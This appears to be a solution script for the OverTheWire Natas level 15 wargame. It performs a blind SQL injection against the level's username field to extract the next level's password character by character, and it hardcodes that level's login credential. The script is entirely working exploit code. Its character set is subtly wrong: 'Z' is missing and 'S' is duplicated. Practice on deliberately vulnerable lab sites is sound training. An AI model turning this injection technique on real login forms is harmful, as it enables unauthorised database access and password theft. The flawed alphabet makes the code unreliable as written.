import requests
from requests.auth import HTTPBasicAuth

user = 'natas15'
psswd = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://natas15.natas.labs.overthewire.org/index.php'

possibleCharacters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYS1234567890'
passwordCharacters = ''
finalPass = ''




for char in possibleCharacters:
	query = {'username':f'natas16" and password LIKE BINARY "%{char}%" #'}
	r = requests.post(url ,data=query, auth=HTTPBasicAuth(user,psswd))
	if "doesn't" not in r.text:
		passwordCharacters = passwordCharacters+char


print(f"Characters that appear on the password: {passwordCharacters}")

print("Starting BRUTE FORCE...")

for i in range(0,32):
	for char in passwordCharacters:
		partialPass = finalPass+char
		query = {'username':f'natas16" and password LIKE BINARY "{partialPass}%" #'}
		r = requests.post(url ,data=query, auth=HTTPBasicAuth(user,psswd))
		if "doesn't" not in r.text:
			finalPass = finalPass+char
			print(f"PASSWORD: {finalPass}")
			break

